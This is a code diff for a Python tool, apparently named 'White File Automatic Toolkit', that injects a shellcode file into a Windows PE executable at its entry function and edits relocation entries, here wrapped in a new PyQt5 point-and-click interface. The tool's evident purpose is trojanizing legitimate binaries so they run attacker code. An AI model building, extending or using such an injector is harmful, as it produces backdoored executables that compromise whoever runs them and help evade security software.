@@ -1,7 +1,10 @@
+import sys
+import os
 import re
-import argparse
 import pefile
-
+from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QFileDialog, QLabel, QMessageBox, QLineEdit
+from PyQt5.QtGui import QIcon
+from PyQt5.QtCore import Qt
 
 def extract_patterns_and_m_values(file_path):
     patterns = {}
@@ -63,7 +66,6 @@ def modify_relocation_entries(pe, target_rva_start, target_rva_end):
                 new_entries.append(entry)
         base_reloc.entries = new_entries
 
-
 def patch_pe(pe_file_path, shellcode_path):
     with open(shellcode_path, 'rb') as f:
         shellcode = f.read()
@@ -94,16 +96,77 @@ def patch_pe(pe_file_path, shellcode_path):
             f.seek(main_offset)
             f.write(shellcode)
         print(f"Patch PE file saved as: {output_file_path}")
+
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
         
+        self.setWindowTitle("White File Automatic Toolkit")
+        self.setGeometry(100, 100, 600, 200)
+        
+        layout = QVBoxLayout()
+        
+        self.label_pe = QLabel("Enter or select a PE file:")
+        layout.addWidget(self.label_pe)
+        
+        self.pe_input = QLineEdit()
+        layout.addWidget(self.pe_input)
+        
+        self.pe_button = QPushButton("Choose PE File")
+        self.pe_button.clicked.connect(self.select_pe_file)
+        layout.addWidget(self.pe_button)
+        
+        self.label_shellcode = QLabel("Enter or select a shellcode file:")
+        layout.addWidget(self.label_shellcode)
+        
+        self.shellcode_input = QLineEdit()
+        layout.addWidget(self.shellcode_input)
+        
+        self.shellcode_button = QPushButton("Choose Shellcode File")
+        self.shellcode_button.clicked.connect(self.select_shellcode_file)
+        layout.addWidget(self.shellcode_button)
+        
+        self.patch_button = QPushButton("Patch PE File")
+        self.patch_button.clicked.connect(self.patch_files)
+        layout.addWidget(self.patch_button)
+        
+        container = QWidget()
+        container.setLayout(layout)
+        self.setCentralWidget(container)
+        icon_path = os.path.join(sys._MEIPASS, 'icon.ico') if getattr(sys, 'frozen', False) else 'icon.ico'
+        self.setWindowIcon(QIcon(icon_path))
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='')
-    parser.add_argument('pe_file_path', help='pe_file_path')
-    parser.add_argument('shellcode_path', help='stage_shellcode_path')
-    args = parser.parse_args()
-    patch_pe(args.pe_file_path, args.shellcode_path)
+    def select_pe_file(self):
+        options = QFileDialog.Options()
+        file_name, _ = QFileDialog.getOpenFileName(self, "Select PE File", "", "PE Files (*.exe *.dll);;All Files (*)", options=options)
+        if file_name:
+            self.pe_input.setText(file_name)
+
+    def select_shellcode_file(self):
+        options = QFileDialog.Options()
+        file_name, _ = QFileDialog.getOpenFileName(self, "Select Shellcode File", "", "Shellcode Files (*.bin);;All Files (*)", options=options)
+        if file_name:
+            self.shellcode_input.setText(file_name)
+
+    def patch_files(self):
+        pe_file_path = self.pe_input.text().strip()
+        shellcode_file_path = self.shellcode_input.text().strip()
+
+        if not pe_file_path or not shellcode_file_path:
+            QMessageBox.warning(self, "Warning", "Please enter or select both a PE file and a shellcode file.")
+            return
+
+        try:
+            patch_pe(pe_file_path, shellcode_file_path)
+            QMessageBox.information(self, "Success", "PE file patched successfully. Output saved as 'output.exe'.")
+        except Exception as e:
+            QMessageBox.critical(self, "Error", str(e))
+
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+    icon_path = os.path.join(sys._MEIPASS, 'icon.ico') if getattr(sys, 'frozen', False) else 'icon.ico'
+    app.setWindowIcon(QIcon(icon_path))
     
-    
-
-
-
+    window = MainWindow()
+    window.show()
+    sys.exit(app.exec_())
